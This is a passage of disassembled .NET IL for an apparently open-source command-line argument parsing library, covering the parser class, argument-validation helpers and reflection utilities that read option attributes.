{
  .field private static initonly class CommandLine.ICommandLineParser _default
  .field private initonly class CommandLine.CommandLineParserSettings _settings
  .method private hidebysig specialname rtspecialname 
          instance void  .ctor(bool singleton) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  ldc.i4.0
    IL_0009:  call       class [mscorlib]System.IO.TextWriter [mscorlib]System.Console::get_Error()
    IL_000e:  newobj     instance void CommandLine.CommandLineParserSettings::.ctor(bool,
                                                                                    bool,
                                                                                    class [mscorlib]System.IO.TextWriter)
    IL_0013:  stfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0018:  ret
  } // end of method CommandLineParser::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  newobj     instance void CommandLine.CommandLineParserSettings::.ctor()
    IL_000c:  stfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0011:  ret
  } // end of method CommandLineParser::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.CommandLineParserSettings settings) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "settings"
    IL_000c:  call       void CommandLine.Assumes::NotNull<class CommandLine.CommandLineParserSettings>(!!0,
                                                                                                        string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0018:  ret
  } // end of method CommandLineParser::.ctor

  .method public hidebysig specialname static 
          class CommandLine.ICommandLineParser 
          get_Default() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class CommandLine.ICommandLineParser CommandLine.CommandLineParser::_default
    IL_0005:  ret
  } // end of method CommandLineParser::get_Default

  .method public hidebysig newslot virtual 
          instance bool  ParseArguments(string[] args,
                                        object options) cil managed
  {
    // Code size       20 (0x14)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.0
    IL_0004:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0009:  callvirt   instance class [mscorlib]System.IO.TextWriter CommandLine.CommandLineParserSettings::get_HelpWriter()
    IL_000e:  callvirt   instance bool CommandLine.CommandLineParser::ParseArguments(string[],
                                                                                     object,
                                                                                     class [mscorlib]System.IO.TextWriter)
    IL_0013:  ret
  } // end of method CommandLineParser::ParseArguments

  .method public hidebysig newslot virtual 
          instance bool  ParseArguments(string[] args,
                                        object options,
                                        class [mscorlib]System.IO.TextWriter helpWriter) cil managed
  {
    // Code size       101 (0x65)
    .maxstack  9
    .locals init ([0] class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,class CommandLine.HelpOptionAttribute> V_0,
             [1] string V_1)
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "args"
    IL_0006:  call       void CommandLine.Assumes::NotNull<string[]>(!!0,
                                                                     string)
    IL_000b:  ldarg.2
    IL_000c:  ldstr      "options"
    IL_0011:  call       void CommandLine.Assumes::NotNull<object>(!!0,
                                                                   string)
    IL_0016:  ldarg.2
    IL_0017:  call       class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,!!0> CommandLine.ReflectionUtil::RetrieveMethod<class CommandLine.HelpOptionAttribute>(object)
    IL_001c:  stloc.0
    IL_001d:  ldloc.0
    IL_001e:  brfalse    IL_005c

    IL_0023:  ldarg.3
    IL_0024:  brfalse    IL_005c

    IL_0029:  ldarg.0
    IL_002a:  ldarg.1
    IL_002b:  ldloc.0
    IL_002c:  callvirt   instance !1 class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,class CommandLine.HelpOptionAttribute>::get_Right()
    IL_0031:  call       instance bool CommandLine.CommandLineParser::ParseHelp(string[],
                                                                                class CommandLine.HelpOptionAttribute)
    IL_0036:  brtrue     IL_0048

    IL_003b:  ldarg.0
    IL_003c:  ldarg.1
    IL_003d:  ldarg.2
    IL_003e:  call       instance bool CommandLine.CommandLineParser::DoParseArguments(string[],
                                                                                       object)
    IL_0043:  brtrue     IL_005a

    IL_0048:  ldarg.2
    IL_0049:  ldloc.0
    IL_004a:  ldloca.s   V_1
    IL_004c:  call       void CommandLine.HelpOptionAttribute::InvokeMethod(object,
                                                                            class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,class CommandLine.HelpOptionAttribute>,
                                                                            string&)
    IL_0051:  ldarg.3
    IL_0052:  ldloc.1
    IL_0053:  callvirt   instance void [mscorlib]System.IO.TextWriter::Write(string)
    IL_0058:  ldc.i4.0
    IL_0059:  ret

    IL_005a:  ldc.i4.1
    IL_005b:  ret

    IL_005c:  ldarg.0
    IL_005d:  ldarg.1
    IL_005e:  ldarg.2
    IL_005f:  call       instance bool CommandLine.CommandLineParser::DoParseArguments(string[],
                                                                                       object)
    IL_0064:  ret
  } // end of method CommandLineParser::ParseArguments

  .method private hidebysig instance bool 
          DoParseArguments(string[] args,
                           object options) cil managed
  {
    // Code size       207 (0xcf)
    .maxstack  14
    .locals init ([0] bool V_0,
             [1] class CommandLine.OptionMap V_1,
             [2] class CommandLine.TargetWrapper V_2,
             [3] class CommandLine.IArgumentEnumerator V_3,
             [4] string V_4,
             [5] class CommandLine.ArgumentParser V_5,
             [6] valuetype CommandLine.ParserState V_6)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldarg.2
    IL_0003:  ldarg.0
    IL_0004:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0009:  call       class CommandLine.OptionMap CommandLine.OptionInfo::CreateMap(object,
                                                                                       class CommandLine.CommandLineParserSettings)
    IL_000e:  stloc.1
    IL_000f:  ldloc.1
    IL_0010:  callvirt   instance void CommandLine.OptionMap::SetDefaults()
    IL_0015:  ldarg.2
    IL_0016:  newobj     instance void CommandLine.TargetWrapper::.ctor(object)
    IL_001b:  stloc.2
    IL_001c:  ldarg.1
    IL_001d:  newobj     instance void CommandLine.StringArrayEnumerator::.ctor(string[])
    IL_0022:  stloc.3
    IL_0023:  br         IL_00b3

    IL_0028:  ldloc.3
    IL_0029:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Current()
    IL_002e:  stloc.s    V_4
    IL_0030:  ldloc.s    V_4
    IL_0032:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0037:  brtrue     IL_00b3

    IL_003c:  ldloc.s    V_4
    IL_003e:  ldarg.0
    IL_003f:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0044:  callvirt   instance bool CommandLine.CommandLineParserSettings::get_IgnoreUnknownArguments()
    IL_0049:  call       class CommandLine.ArgumentParser CommandLine.ArgumentParser::Create(string,
                                                                                             bool)
    IL_004e:  stloc.s    V_5
    IL_0050:  ldloc.s    V_5
    IL_0052:  brfalse    IL_0099

    IL_0057:  ldloc.s    V_5
    IL_0059:  ldloc.3
    IL_005a:  ldloc.1
    IL_005b:  ldarg.2
    IL_005c:  callvirt   instance valuetype CommandLine.ParserState CommandLine.ArgumentParser::Parse(class CommandLine.IArgumentEnumerator,
                                                                                                      class CommandLine.OptionMap,
                                                                                                      object)
    IL_0061:  stloc.s    V_6
    IL_0063:  ldloc.s    V_6
    IL_0065:  ldc.i4.2
    IL_0066:  and
    IL_0067:  conv.u2
    IL_0068:  ldc.i4.2
    IL_0069:  bne.un     IL_0082

    IL_006e:  ldarg.2
    IL_006f:  ldloc.s    V_5
    IL_0071:  callvirt   instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.ArgumentParser::get_PostParsingState()
    IL_0076:  call       void CommandLine.CommandLineParser::SetPostParsingStateIfNeeded(object,
                                                                                         class [mscorlib]System.Collections.Generic.IEnumerable`1<class CommandLine.ParsingError>)
    IL_007b:  ldc.i4.1
    IL_007c:  stloc.0
    IL_007d:  br         IL_00b3

    IL_0082:  ldloc.s    V_6
    IL_0084:  ldc.i4.4
    IL_0085:  and
    IL_0086:  conv.u2
    IL_0087:  ldc.i4.4
    IL_0088:  bne.un     IL_00b3

    IL_008d:  ldloc.3
    IL_008e:  callvirt   instance bool CommandLine.IArgumentEnumerator::MoveNext()
    IL_0093:  pop
    IL_0094:  br         IL_00b3

    IL_0099:  ldloc.2
    IL_009a:  callvirt   instance bool CommandLine.TargetWrapper::get_IsValueListDefined()
    IL_009f:  brfalse    IL_00b3

    IL_00a4:  ldloc.2
    IL_00a5:  ldloc.s    V_4
    IL_00a7:  callvirt   instance bool CommandLine.TargetWrapper::AddValueItemIfAllowed(string)
    IL_00ac:  brtrue     IL_00b3

    IL_00b1:  ldc.i4.1
    IL_00b2:  stloc.0
    IL_00b3:  ldloc.3
    IL_00b4:  callvirt   instance bool CommandLine.IArgumentEnumerator::MoveNext()
    IL_00b9:  brtrue     IL_0028

    IL_00be:  ldloc.0
    IL_00bf:  ldloc.1
    IL_00c0:  callvirt   instance bool CommandLine.OptionMap::EnforceRules()
    IL_00c5:  ldc.i4.0
    IL_00c6:  ceq
    IL_00c8:  or
    IL_00c9:  stloc.0
    IL_00ca:  ldloc.0
    IL_00cb:  ldc.i4.0
    IL_00cc:  ceq
    IL_00ce:  ret
  } // end of method CommandLineParser::DoParseArguments

  .method private hidebysig instance bool 
          ParseHelp(string[] args,
                    class CommandLine.HelpOptionAttribute helpOption) cil managed
  {
    // Code size       115 (0x73)
    .maxstack  9
    .locals init ([0] bool V_0,
             [1] int32 V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.CommandLineParser::_settings
    IL_0006:  callvirt   instance bool CommandLine.CommandLineParserSettings::get_CaseSensitive()
    IL_000b:  stloc.0
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.1
    IL_000e:  br         IL_006b

    IL_0013:  ldarg.2
    IL_0014:  callvirt   instance string CommandLine.BaseOptionAttribute::get_ShortName()
    IL_0019:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_001e:  brtrue     IL_003d

    IL_0023:  ldarg.1
    IL_0024:  ldloc.1
    IL_0025:  ldelem     [mscorlib]System.String
    IL_002a:  ldarg.2
    IL_002b:  callvirt   instance string CommandLine.BaseOptionAttribute::get_ShortName()
    IL_0030:  ldloc.0
    IL_0031:  call       bool CommandLine.ArgumentParser::CompareShort(string,
                                                                       string,
                                                                       bool)
    IL_0036:  brfalse    IL_003d

    IL_003b:  ldc.i4.1
    IL_003c:  ret

    IL_003d:  ldarg.2
    IL_003e:  callvirt   instance string CommandLine.BaseOptionAttribute::get_LongName()
    IL_0043:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0048:  brtrue     IL_0067

    IL_004d:  ldarg.1
    IL_004e:  ldloc.1
    IL_004f:  ldelem     [mscorlib]System.String
    IL_0054:  ldarg.2
    IL_0055:  callvirt   instance string CommandLine.BaseOptionAttribute::get_LongName()
    IL_005a:  ldloc.0
    IL_005b:  call       bool CommandLine.ArgumentParser::CompareLong(string,
                                                                      string,
                                                                      bool)
    IL_0060:  brfalse    IL_0067

    IL_0065:  ldc.i4.1
    IL_0066:  ret

    IL_0067:  ldloc.1
    IL_0068:  ldc.i4.1
    IL_0069:  add
    IL_006a:  stloc.1
    IL_006b:  ldloc.1
    IL_006c:  ldarg.1
    IL_006d:  ldlen
    IL_006e:  conv.i4
    IL_006f:  blt.s      IL_0013

    IL_0071:  ldc.i4.0
    IL_0072:  ret
  } // end of method CommandLineParser::ParseHelp

  .method private hidebysig static void  SetPostParsingStateIfNeeded(object options,
                                                                     class [mscorlib]System.Collections.Generic.IEnumerable`1<class CommandLine.ParsingError> state) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  7
    .locals init ([0] class CommandLine.CommandLineOptionsBase V_0)
    IL_0000:  ldarg.0
    IL_0001:  isinst     CommandLine.CommandLineOptionsBase
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  brfalse    IL_001e

    IL_000d:  ldloc.0
    IL_000e:  callvirt   instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_InternalLastPostParsingState()
    IL_0013:  callvirt   instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::get_Errors()
    IL_0018:  ldarg.1
    IL_0019:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::AddRange(class [mscorlib]System.Collections.Generic.IEnumerable`1<!0>)
    IL_001e:  ret
  } // end of method CommandLineParser::SetPostParsingStateIfNeeded

  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldc.i4.1
    IL_0001:  newobj     instance void CommandLine.CommandLineParser::.ctor(bool)
    IL_0006:  stsfld     class CommandLine.ICommandLineParser CommandLine.CommandLineParser::_default
    IL_000b:  ret
  } // end of method CommandLineParser::.cctor

  .property class CommandLine.ICommandLineParser
          Default()
  {
    .get class CommandLine.ICommandLineParser CommandLine.CommandLineParser::get_Default()
  } // end of property CommandLineParser::Default
} // end of class CommandLine.CommandLineParser

.class private abstract auto ansi sealed beforefieldinit CommandLine.Assumes
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  NotNull<class T>(!!T 'value',
                                                         string paramName) cil managed
  {
    // Code size       19 (0x13)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  box        !!T
    IL_0006:  brtrue     IL_0012

    IL_000b:  ldarg.1
    IL_000c:  newobj     instance void [mscorlib]System.ArgumentNullException::.ctor(string)
    IL_0011:  throw

    IL_0012:  ret
  } // end of method Assumes::NotNull

  .method public hidebysig static void  NotNullOrEmpty(string 'value',
                                                       string paramName) cil managed
  {
    // Code size       19 (0x13)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0006:  brfalse    IL_0012

    IL_000b:  ldarg.1
    IL_000c:  newobj     instance void [mscorlib]System.ArgumentException::.ctor(string)
    IL_0011:  throw

    IL_0012:  ret
  } // end of method Assumes::NotNullOrEmpty

  .method public hidebysig static void  NotZeroLength<T>(!!T[] 'array',
                                                         string paramName) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldlen
    IL_0002:  conv.i4
    IL_0003:  brtrue     IL_000f

    IL_0008:  ldarg.1
    IL_0009:  newobj     instance void [mscorlib]System.ArgumentOutOfRangeException::.ctor(string)
    IL_000e:  throw

    IL_000f:  ret
  } // end of method Assumes::NotZeroLength

} // end of class CommandLine.Assumes

.class private abstract auto ansi sealed beforefieldinit CommandLine.ReflectionUtil
       extends [mscorlib]System.Object
{
  .method public hidebysig static class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!TAttribute>> 
          RetrievePropertyList<([mscorlib]System.Attribute) TAttribute>(object target) cil managed
  {
    // Code size       160 (0xa0)
    .maxstack  10
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!TAttribute>> V_0,
             [1] class [mscorlib]System.Reflection.PropertyInfo[] V_1,
             [2] class [mscorlib]System.Reflection.PropertyInfo[] V_2,
             [3] int32 V_3,
             [4] class [mscorlib]System.Reflection.PropertyInfo V_4,
             [5] class [mscorlib]System.Reflection.MethodInfo V_5,
             [6] class [mscorlib]System.Attribute V_6)
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!TAttribute>>::.ctor()
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse    IL_009e

    IL_000c:  ldarg.0
    IL_000d:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
    IL_0012:  callvirt   instance class [mscorlib]System.Reflection.PropertyInfo[] [mscorlib]System.Type::GetProperties()
    IL_0017:  stloc.1
    IL_0018:  ldloc.1
    IL_0019:  stloc.2
    IL_001a:  ldc.i4.0
    IL_001b:  stloc.3
    IL_001c:  br         IL_0098

    IL_0021:  ldloc.2
    IL_0022:  ldloc.3
    IL_0023:  ldelem     [mscorlib]System.Reflection.PropertyInfo
    IL_0028:  stloc.s    V_4
    IL_002a:  ldloc.s    V_4
    IL_002c:  brfalse    IL_0094

    IL_0031:  ldloc.s    V_4
    IL_0033:  callvirt   instance bool [mscorlib]System.Reflection.PropertyInfo::get_CanRead()
    IL_0038:  brfalse    IL_0094

    IL_003d:  ldloc.s    V_4
    IL_003f:  callvirt   instance bool [mscorlib]System.Reflection.PropertyInfo::get_CanWrite()
    IL_0044:  brfalse    IL_0094

    IL_0049:  ldloc.s    V_4
    IL_004b:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo [mscorlib]System.Reflection.PropertyInfo::GetSetMethod()
    IL_0050:  stloc.s    V_5
    IL_0052:  ldloc.s    V_5
    IL_0054:  brfalse    IL_0094

    IL_0059:  ldloc.s    V_5
    IL_005b:  callvirt   instance bool [mscorlib]System.Reflection.MethodBase::get_IsStatic()
    IL_0060:  brtrue     IL_0094

    IL_0065:  ldloc.s    V_4
    IL_0067:  ldtoken    !!TAttribute
    IL_006c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0071:  ldc.i4.0
    IL_0072:  call       class [mscorlib]System.Attribute [mscorlib]System.Attribute::GetCustomAttribute(class [mscorlib]System.Reflection.MemberInfo,
                                                                                                         class [mscorlib]System.Type,
                                                                                                         bool)
    IL_0077:  stloc.s    V_6
    IL_0079:  ldloc.s    V_6
    IL_007b:  brfalse    IL_0094

    IL_0080:  ldloc.0
    IL_0081:  ldloc.s    V_4
    IL_0083:  ldloc.s    V_6
    IL_0085:  unbox.any  !!TAttribute
    IL_008a:  newobj     instance void class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!TAttribute>::.ctor(!0,
                                                                                                                                    !1)
    IL_008f:  callvirt   instance void class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!TAttribute>>::Add(!0)
    IL_0094:  ldloc.3
    IL_0095:  ldc.i4.1
    IL_0096:  add
    IL_0097:  stloc.3
    IL_0098:  ldloc.3
    IL_0099:  ldloc.2
    IL_009a:  ldlen
    IL_009b:  conv.i4
    IL_009c:  blt.s      IL_0021

    IL_009e:  ldloc.0
    IL_009f:  ret
  } // end of method ReflectionUtil::RetrievePropertyList

  .method public hidebysig static class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,!!TAttribute> 
          RetrieveMethod<([mscorlib]System.Attribute) TAttribute>(object target) cil managed
  {
    // Code size       101 (0x65)
    .maxstack  6
    .locals init ([0] class [mscorlib]System.Reflection.MethodInfo[] V_0,
             [1] class [mscorlib]System.Reflection.MethodInfo[] V_1,
             [2] int32 V_2,
             [3] class [mscorlib]System.Reflection.MethodInfo V_3,
             [4] class [mscorlib]System.Attribute V_4,
             [5] class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,!!TAttribute> V_5)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo[] [mscorlib]System.Type::GetMethods()
    IL_000b:  stloc.0
    IL_000c:  ldloc.0
    IL_000d:  stloc.1
    IL_000e:  ldc.i4.0
    IL_000f:  stloc.2
    IL_0010:  br         IL_005a

    IL_0015:  ldloc.1
    IL_0016:  ldloc.2
    IL_0017:  ldelem     [mscorlib]System.Reflection.MethodInfo
    IL_001c:  stloc.3
    IL_001d:  ldloc.3
    IL_001e:  callvirt   instance bool [mscorlib]System.Reflection.MethodBase::get_IsStatic()
    IL_0023:  brtrue     IL_0056

    IL_0028:  ldloc.3
    IL_0029:  ldtoken    !!TAttribute
    IL_002e:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0033:  ldc.i4.0
    IL_0034:  call       class [mscorlib]System.Attribute [mscorlib]System.Attribute::GetCustomAttribute(class [mscorlib]System.Reflection.MemberInfo,
                                                                                                         class [mscorlib]System.Type,
                                                                                                         bool)
    IL_0039:  stloc.s    V_4
    IL_003b:  ldloc.s    V_4
    IL_003d:  brfalse    IL_0056

    IL_0042:  ldloc.3
    IL_0043:  ldloc.s    V_4
    IL_0045:  unbox.any  !!TAttribute
    IL_004a:  newobj     instance void class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,!!TAttribute>::.ctor(!0,
                                                                                                                                  !1)
    IL_004f:  stloc.s    V_5
    IL_0051:  leave      IL_0062

    IL_0056:  ldloc.2
    IL_0057:  ldc.i4.1
    IL_0058:  add
    IL_0059:  stloc.2
    IL_005a:  ldloc.2
    IL_005b:  ldloc.1
    IL_005c:  ldlen
    IL_005d:  conv.i4
    IL_005e:  blt.s      IL_0015

    IL_0060:  ldnull
    IL_0061:  ret

    IL_0062:  ldloc.s    V_5
    IL_0064:  ret
  } // end of method ReflectionUtil::RetrieveMethod

  .method public hidebysig static !!TAttribute 
          RetrieveMethodAttributeOnly<([mscorlib]System.Attribute) TAttribute>(object target) cil managed
  {
    // Code size       104 (0x68)
    .maxstack  6
    .locals init ([0] class [mscorlib]System.Reflection.MethodInfo[] V_0,
             [1] class [mscorlib]System.Reflection.MethodInfo[] V_1,
             [2] int32 V_2,
             [3] class [mscorlib]System.Reflection.MethodInfo V_3,
             [4] class [mscorlib]System.Attribute V_4,
             [5] !!TAttribute V_5,
             [6] !!TAttribute V_6)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo[] [mscorlib]System.Type::GetMethods()
    IL_000b:  stloc.0
    IL_000c:  ldloc.0
    IL_000d:  stloc.1
    IL_000e:  ldc.i4.0
    IL_000f:  stloc.2
    IL_0010:  br         IL_0054

    IL_0015:  ldloc.1
    IL_0016:  ldloc.2
    IL_0017:  ldelem     [mscorlib]System.Reflection.MethodInfo
    IL_001c:  stloc.3
    IL_001d:  ldloc.3
    IL_001e:  callvirt   instance bool [mscorlib]System.Reflection.MethodBase::get_IsStatic()
    IL_0023:  brtrue     IL_0050

    IL_0028:  ldloc.3
    IL_0029:  ldtoken    !!TAttribute
    IL_002e:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0033:  ldc.i4.0
    IL_0034:  call       class [mscorlib]System.Attribute [mscorlib]System.Attribute::GetCustomAttribute(class [mscorlib]System.Reflection.MemberInfo,
                                                                                                         class [mscorlib]System.Type,
                                                                                                         bool)
    IL_0039:  stloc.s    V_4
    IL_003b:  ldloc.s    V_4
    IL_003d:  brfalse    IL_0050

    IL_0042:  ldloc.s    V_4
    IL_0044:  unbox.any  !!TAttribute
    IL_0049:  stloc.s    V_5
    IL_004b:  leave      IL_0065

    IL_0050:  ldloc.2
    IL_0051:  ldc.i4.1
    IL_0052:  add
    IL_0053:  stloc.2
    IL_0054:  ldloc.2
    IL_0055:  ldloc.1
    IL_0056:  ldlen
    IL_0057:  conv.i4
    IL_0058:  blt.s      IL_0015

    IL_005a:  ldloca.s   V_6
    IL_005c:  initobj    !!TAttribute
    IL_0062:  ldloc.s    V_6
    IL_0064:  ret

    IL_0065:  ldloc.s    V_5
    IL_0067:  ret
  } // end of method ReflectionUtil::RetrieveMethodAttributeOnly

  .method public hidebysig static class [mscorlib]System.Collections.Generic.IList`1<!!TAttribute> 
          RetrievePropertyAttributeList<([mscorlib]System.Attribute) TAttribute>(object target) cil managed
  {
    // Code size       147 (0x93)
    .maxstack  10
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<!!TAttribute> V_0,
             [1] class [mscorlib]System.Reflection.PropertyInfo[] V_1,
             [2] class [mscorlib]System.Reflection.PropertyInfo[] V_2,
             [3] int32 V_3,
             [4] class [mscorlib]System.Reflection.PropertyInfo V_4,
             [5] class [mscorlib]System.Reflection.MethodInfo V_5,
             [6] class [mscorlib]System.Attribute V_6)
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<!!TAttribute>::.ctor()
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Object::GetType()
    IL_000c:  callvirt   instance class [mscorlib]System.Reflection.PropertyInfo[] [mscorlib]System.Type::GetProperties()
    IL_0011:  stloc.1
    IL_0012:  ldloc.1
    IL_0013:  stloc.2
    IL_0014:  ldc.i4.0
    IL_0015:  stloc.3
    IL_0016:  br         IL_008b

    IL_001b:  ldloc.2
    IL_001c:  ldloc.3
    IL_001d:  ldelem     [mscorlib]System.Reflection.PropertyInfo
    IL_0022:  stloc.s    V_4
    IL_0024:  ldloc.s    V_4
    IL_0026:  brfalse    IL_0087

    IL_002b:  ldloc.s    V_4
    IL_002d:  callvirt   instance bool [mscorlib]System.Reflection.PropertyInfo::get_CanRead()
    IL_0032:  brfalse    IL_0087

    IL_0037:  ldloc.s    V_4
    IL_0039:  callvirt   instance bool [mscorlib]System.Reflection.PropertyInfo::get_CanWrite()
    IL_003e:  brfalse    IL_0087

    IL_0043:  ldloc.s    V_4
    IL_0045:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo [mscorlib]System.Reflection.PropertyInfo::GetSetMethod()
    IL_004a:  stloc.s    V_5
    IL_004c:  ldloc.s    V_5
    IL_004e:  brfalse    IL_0087

    IL_0053:  ldloc.s    V_5
    IL_0055:  callvirt   instance bool [mscorlib]System.Reflection.MethodBase::get_IsStatic()
    IL_005a:  brtrue     IL_0087

    IL_005f:  ldloc.s    V_4
    IL_0061:  ldtoken    !!TAttribute
    IL_0066:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_006b:  ldc.i4.0
    IL_006c:  call       class [mscorlib]System.Attribute [mscorlib]System.Attribute::GetCustomAttribute(class [mscorlib]System.Reflection.MemberInfo,
                                                                                                         class [mscorlib]System.Type,
                                                                                                         bool)
    IL_0071:  stloc.s    V_6
    IL_0073:  ldloc.s    V_6
    IL_0075:  brfalse    IL_0087

    IL_007a:  ldloc.0
    IL_007b:  ldloc.s    V_6
    IL_007d:  unbox.any  !!TAttribute
    IL_0082:  callvirt   instance void class [mscorlib]System.Collections.Generic.ICollection`1<!!TAttribute>::Add(!0)
    IL_0087:  ldloc.3
    IL_0088:  ldc.i4.1
    IL_0089:  add
    IL_008a:  stloc.3
    IL_008b:  ldloc.3
    IL_008c:  ldloc.2
    IL_008d:  ldlen
    IL_008e:  conv.i4
    IL_008f:  blt.s      IL_001b

    IL_0091:  ldloc.0
    IL_0092:  ret
  } // end of method ReflectionUtil::RetrievePropertyAttributeList

  .method public hidebysig static !!TAttribute 
          GetAttribute<([mscorlib]System.Attribute) TAttribute>() cil managed
  {
    // Code size       56 (0x38)
    .maxstack  4
    .locals init ([0] object[] V_0,
             [1] !!TAttribute V_1)
    IL_0000:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0005:  ldtoken    !!TAttribute
    IL_000a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_000f:  ldc.i4.0
    IL_0010:  callvirt   instance object[] [mscorlib]System.Reflection.Assembly::GetCustomAttributes(class [mscorlib]System.Type,
                                                                                                     bool)
    IL_0015:  stloc.0
    IL_0016:  ldloc.0
    IL_0017:  brfalse    IL_0025

    IL_001c:  ldloc.0
    IL_001d:  ldlen
    IL_001e:  conv.i4
    IL_001f:  ldc.i4.0
    IL_0020:  bgt        IL_002f

    IL_0025:  ldloca.s   V_1
    IL_0027:  initobj    !!TAttribute
    IL_002d:  ldloc.1
    IL_002e:  ret

    IL_002f:  ldloc.0
    IL_0030:  ldc.i4.0
    IL_0031:  ldelem.ref
    IL_0032:  unbox.any  !!TAttribute
    IL_0037:  ret
  } // end of method ReflectionUtil::GetAttribute

  .method public hidebysig static bool  IsNullableType(class [mscorlib]System.Type 'type') cil managed
  {
    // Code size       32 (0x20)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance bool [mscorlib]System.Type::get_IsGenericType()
    IL_0006:  brfalse    IL_001e

    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Type::GetGenericTypeDefinition()
    IL_0011:  ldtoken    [mscorlib]System.Nullable`1
    IL_0016:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001b:  ceq
    IL_001d:  ret

    IL_001e:  ldc.i4.0
    IL_001f:  ret
  } // end of method ReflectionUtil::IsNullableType

} // end of class CommandLine.ReflectionUtil

